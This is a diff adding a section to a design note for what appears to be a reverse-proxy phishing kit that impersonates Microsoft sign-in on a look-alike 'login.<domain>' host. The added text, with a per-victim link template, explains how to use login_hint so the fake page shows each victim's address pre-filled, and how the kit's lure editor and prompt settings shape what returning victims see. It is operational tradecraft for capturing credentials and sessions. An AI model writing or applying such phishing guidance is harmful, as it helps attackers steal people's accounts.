@@ -63,3 +63,31 @@ credential prompt, which Microsoft answers with `AADSTS90100`.
 provider answer silently when possible and fall back when not, which needs the
 error path (`interaction_required`) handled; `off` is the closest thing today and
 is honest about the trade-off (session-only capture).
+
+## login_hint is the widest lever
+
+The account picker is **not universal**. It needs a prior *completed* login on
+our host (the remembering `ESTSAUTHPERSISTENT` cookie is host-only on
+`login.<domain>`, so a browser signed into real Office - whose cookies live on
+`login.microsoftonline.com` - still gets a fresh login on its first visit to us).
+See `experiments/passwordless.md` §12.
+
+`login_hint` is the one thing that works on **any** browser, cold included: the
+link names the address, Microsoft skips the email step and renders the password
+page pre-filled, with no typing of the email and no picker needed. Emit it
+per victim:
+
+```
+https://login.<domain>/auth/login?login_hint={victim@example.com}
+```
+
+The engine already forwards `login_hint` untouched (asserted in
+`http_proxy_test.go`). The Control Panel lure editor shows and copies this
+template under **Per-victim link (login_hint)**.
+
+Cost: one link per victim (or a mail-merge field), and the account is named, so a
+victim with several accounts does not get to choose. Pair it with a per-lure
+`login_prompt: select_account` if you also want returning visitors to see a
+one-click picker; on a warm jar an explicit `select_account` is preserved, and in
+current Microsoft builds the picker appears for a warm visitor even under
+`prompt=login` (the prompt then only changes the wording).
